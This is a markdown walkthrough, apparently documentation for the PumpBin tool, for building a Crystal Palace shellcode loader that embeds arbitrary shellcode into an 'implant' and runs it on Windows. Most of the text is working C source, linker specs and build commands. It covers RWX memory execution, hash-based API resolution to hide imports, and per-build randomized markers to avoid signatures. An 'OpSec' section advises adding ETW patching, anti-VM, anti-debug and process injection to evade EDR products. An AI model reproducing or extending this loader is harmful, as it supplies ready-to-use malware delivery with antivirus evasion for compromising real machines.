# Using PumpBin with Crystal Palace

This walkthrough produces a Crystal Palace–based PIC loader that
PumpBin stamps shellcode into, then runs on Windows with no
`CreateThread`, no `cmd /c`, and API resolution via ROR13 hash inside
the PIC. Verified end-to-end against Win10 19045.

It's the recipe behind the in-repo Step-10 test: every command below
is the same one I ran on Linux with MinGW + Crystal Palace's official
distribution.

## Prerequisites

- MinGW cross compiler. On Arch: `pacman -S mingw-w64`. On Debian:
  `apt install mingw-w64`.
- Java runtime. `apt install default-jre` or equivalent.
- Crystal Palace distribution (BSD-3, freely downloadable from
  Tradecraft Garden):
  ```
  curl -OL https://tradecraftgarden.org/download/cpdist20260413.tgz
  tar xzf cpdist20260413.tgz       # → ./dist/
  ```
- Tradecraft Garden source for `libtcg`:
  ```
  curl -OL https://tradecraftgarden.org/download/tcg-latest.tgz
  tar xzf tcg-latest.tgz           # → ./tcg/
  cd tcg/libtcg && make x64        # → ./tcg/libtcg/libtcg.x64.zip
  ```
- PumpBin built locally: `cargo build --no-default-features --release --bin pumpbin-cli`.

## The recipe

### 1. Scaffold a PIC-friendly loader

```bash
pumpbin-cli new-loader cp-pumpbin \
    --platform windows \
    --padding-bytes 8192 \
    --randomize-markers \
    --binary-size-holder
```

The scaffold writes a Cargo crate, *but we won't use the Rust template*
— we're going to drop in a Crystal Palace C source instead. We
**still** use it for two outputs:

- A `pumpbin-pack.sh` that bakes in the right `--prefix`,
  `--size-holder`, and `--max-len` flags from this build.
- The randomized 13-byte prefix and 4-byte size-holder markers we'll
  embed in the CP source. Read them out of the generated
  `pumpbin-pack.sh`:

  ```
  grep -E "(prefix|size-holder|max-len)" cp-pumpbin/pumpbin-pack.sh
  #   --prefix       'Ab9KqRtNpMq2L'
  #   --size-holder  'L3xR'
  #   --max-len      8192
  ```

  Take those three values into the next step.

### 2. Author the CP loader's C source

The CP source lives somewhere of your choice, alongside a `.spec`
file. The structure mirrors `tcg/simple_obj`:

```c
// loader.c
#include <windows.h>
#include "tcg.h"   // from tcg/libtcg/src/tcg.h

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(
    LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

// DFR resolver — Crystal Palace rewrites every MODULE$Function call
// to use this. The result: VirtualAlloc gets resolved by ROR13 hash
// at runtime; no IAT entry; no "VirtualAlloc" string in the PIC.
FARPROC resolve(DWORD modHash, DWORD funcHash) {
    HANDLE hModule = findModuleByHash(modHash);
    return findFunctionByHash(hModule, funcHash);
}

// Empty symbol at the section CP's spec injects bytes into.
char __SC_DATA__[0] __attribute__((section("sc_data")));

#define PB_PADDING        8192   // must match --padding-bytes above
#define PB_SIZE_OFFSET    (13 + PB_PADDING)  // = 8205

void go(void) {
    volatile const unsigned char *blob = (volatile const unsigned char *)&__SC_DATA__;

    // PumpBin's 4-byte size-holder (--binary-size-holder) lives right
    // after the padding. Read u32 LE.
    unsigned char szb[4] = {
        blob[PB_SIZE_OFFSET + 0], blob[PB_SIZE_OFFSET + 1],
        blob[PB_SIZE_OFFSET + 2], blob[PB_SIZE_OFFSET + 3],
    };
    unsigned int sc_len = (unsigned int)szb[0]
        | ((unsigned int)szb[1] << 8)
        | ((unsigned int)szb[2] << 16)
        | ((unsigned int)szb[3] << 24);

    if (sc_len == 0 || sc_len > PB_PADDING) return;

    LPVOID exec = KERNEL32$VirtualAlloc(
        NULL, (SIZE_T)sc_len,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);
    if (exec == NULL) return;

    // hand-rolled memcpy (no msvcrt drag-in)
    char *dst = (char *)exec;
    for (unsigned int i = 0; i < sc_len; i++) dst[i] = (char)blob[i];

    // Main-thread direct call. NO CreateThread.
    ((void (*)(void))exec)();
}
```

```spec
# loader.spec
# $PLACEHOLDER (from CLI) is the random-marker + padding + 4-byte
# size-holder blob. We let pumpbin-pack.sh provide it.
x64:
    load "bin/loader.x64.o"
        make pic +gofirst +optimize
        dfr "resolve" "ror13"
        mergelib "/path/to/tcg/libtcg/libtcg.x64.zip"

        push $PLACEHOLDER
            link "sc_data"

        export
```

### 3. Compile + link CP

```bash
mkdir -p bin
x86_64-w64-mingw32-gcc -DWIN_X64 -O1 -fno-jump-tables -shared \
    -Wall -Wno-pointer-arith -c loader.c -o bin/loader.x64.o

# Build the placeholder hex: <prefix> + <padding-bytes of '0'> + <size-holder>
python3 -c "
import sys
prefix = b'Ab9KqRtNpMq2L'   # ← the random prefix from pumpbin-pack.sh
size   = b'L3xR'             # ← the random size-holder
hb = prefix + b'0'*8192 + size
sys.stdout.write(hb.hex())
" > placeholder.hex

/path/to/cpdist/piclink loader.spec x64 cp_loader.bin \
    "PLACEHOLDER=$(cat placeholder.hex)"
```

You now have `cp_loader.bin` — a real Crystal Palace PIC with PumpBin's
two markers embedded.

### 4. Pack and stamp with PumpBin

The `pumpbin-pack.sh` the scaffold wrote already has the right flags;
just point it at the CP binary instead of the unused Rust target:

```bash
pumpbin-cli create-b1n \
    --template cp_loader.bin \
    --output   cp.b1n \
    --name     cp-pumpbin \
    --platform windows --type exe \
    --prefix       'Ab9KqRtNpMq2L' \
    --size-holder  'L3xR' \
    --max-len      8192

pumpbin-cli generate \
    -p cp.b1n \
    -s your_real_shellcode.bin \
    --platform windows -t exe \
    -o implant.bin
```

`implant.bin` is now your stamped PIC, ready to be loaded into a
process.

### 5. (Optional) Wrap in a one-shot exe runner

If you need a Win64 PE that just maps the PIC and jumps to it, the
smallest reasonable wrapper is:

```c
// runner.c
#include <windows.h>

__asm__(
    ".section .rdata, \"d\"\n"
    ".globl pic_data\n"
    "pic_data:\n"
    ".incbin \"implant.bin\"\n"
    ".globl pic_data_end\n"
    "pic_data_end:\n"
);
extern char pic_data[];
extern char pic_data_end[];

int main(void) {
    size_t len = (size_t)(pic_data_end - pic_data);
    LPVOID exec = VirtualAlloc(NULL, len, MEM_COMMIT|MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    if (exec == NULL) return 2;
    for (size_t i = 0; i < len; i++) ((char*)exec)[i] = pic_data[i];
    ((void (*)(void))exec)();   // main-thread direct call; NO CreateThread
    return 0;
}
```

```
x86_64-w64-mingw32-gcc -O2 -s -Wall runner.c -o runner.exe
```

Note: this runner's IAT contains exactly one Win32 import,
`KERNEL32!VirtualAlloc`. Everything else lives in the CP PIC and is
ROR13-resolved at runtime. If you want a runner with zero IAT
imports, write the runner itself as a second-stage PIC and load it
with the same pattern from a smaller stage-0 (out of scope here).

## What this gives you (and what it doesn't)

**Honored OpSec rules.**
- No `CreateThread` / `CreateRemoteThread` anywhere.
- No `cmd /c` wrapping in the operational binary.
- `KERNEL32`, `VirtualAlloc`, `LoadLibrary` etc. never appear as
  plaintext strings in the stamped PIC — all resolved by ROR13 hash
  inside libtcg.
- Per-build random `--prefix` and `--size-holder` markers via
  `--randomize-markers`: no cross-build static signature.
- Tight `--padding-bytes 8192` instead of the 1 MiB default: keeps
  the binary small and avoids the argv overflow you'd hit feeding a
  1 MB hex string to `piclink` on the command line.
- `--binary-size-holder` skips the decimal-text length parsing — your
  PIC stays clean of `core::fmt` / equivalent code paths.

**What this does NOT do for you.**
- The outer runner's `KERNEL32!VirtualAlloc` IAT entry is visible.
  EDRs YARA-scanning the wrapper alone will see "small exe + RWX
  alloc". Mitigation is to skip the wrapper entirely and run the
  PIC via process injection / staged delivery.
- No sleep mask. The PIC executes synchronously; if your inner
  shellcode does long-lived work, RWX memory is sitting visible to
  scanners.
- No ETW patching. If your shellcode does anything ETW-monitored
  (e.g., AMSI'd execution), Elastic/MDE will see it. Add an
  ETW-patch step inside the CP PIC.
- No anti-VM, no anti-debug, no sandbox-check. If you need those,
  add them to the CP source.
- Donut / sRDI integration not covered here — see
  [examples/modules/post-build-python/](../examples/modules/post-build-python/)
  for a template that fits the pumpbin post-build module slot.

## Where to look next

- The scaffold's `pumpbin-pack.sh` is your reference for the exact
  flag set this build expects. Always read it.
- The Crystal Palace distribution's `dist/README` + `dist/demo/`
  walk through the linker spec language (`make pic`, `dfr`,
  `mergelib`, `link`).
- libtcg's source at `tcg/libtcg/src/` shows how `findModuleByHash`,
  `findFunctionByHash`, and the bootstrap services work.
- [docs/archive/](archive/) holds the pre-v2 brainstorm notes; the
  current single source of truth is [../ROADMAP.md](../ROADMAP.md).
